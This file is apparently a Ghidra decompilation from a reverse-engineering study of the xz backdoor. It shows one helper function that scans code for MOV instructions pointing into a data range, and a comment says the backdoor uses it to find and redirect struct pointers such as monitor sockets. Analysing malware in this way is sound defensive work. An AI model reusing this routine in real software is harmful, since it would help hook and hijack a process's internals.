// /home/kali/xzre-ghidra/xzregh/102C60_find_addr_referenced_in_mov_instruction.c
// Function: find_addr_referenced_in_mov_instruction @ 0x102C60
// Calling convention: unknown
// Prototype: undefined find_addr_referenced_in_mov_instruction(void)


/*
 * AutoDoc: Scans a referenced function for MOV instructions that materialise an address inside the supplied data window. The backdoor uses it to recover struct-field pointers (for example the monitor sockets) so it can redirect them to its own handlers.
 */
#include "xzre_types.h"


ulong find_addr_referenced_in_mov_instruction(uint param_1,long param_2,ulong param_3,long param_4)

{
  ulong uVar1;
  int iVar2;
  ulong uVar3;
  long lVar4;
  long *plVar5;
  ulong uVar6;
  long local_80;
  long local_78;
  byte local_6f;
  byte local_65;
  uint local_64;
  ulong local_50;
  
  plVar5 = &local_80;
  for (lVar4 = 0x16; lVar4 != 0; lVar4 = lVar4 + -1) {
    *(undefined4 *)plVar5 = 0;
    plVar5 = (long *)((long)plVar5 + 4);
  }
  param_2 = param_2 + (ulong)param_1 * 0x20;
  uVar6 = *(ulong *)(param_2 + 8);
  if (uVar6 != 0) {
    uVar1 = *(ulong *)(param_2 + 0x10);
    while (uVar6 < uVar1) {
      iVar2 = find_instruction_with_mem_operand_ex(uVar6,uVar1,&local_80,0x10b,0);
      if (iVar2 == 0) {
        uVar6 = uVar6 + 1;
      }
      else {
        if ((local_65 & 0x48) != 0x48) {
          if ((local_6f & 1) == 0) {
            if (param_3 == 0) {
              return 0;
            }
          }
          else {
            uVar3 = local_50;
            if ((local_64 & 0xff00ff00) == 0x5000000) {
              uVar3 = local_50 + local_80 + local_78;
            }
            if ((param_3 <= uVar3) && (uVar3 <= param_4 - 4U)) {
              return uVar3;
            }
          }
        }
        uVar6 = uVar6 + local_78;
      }
    }
  }
  return 0;
}

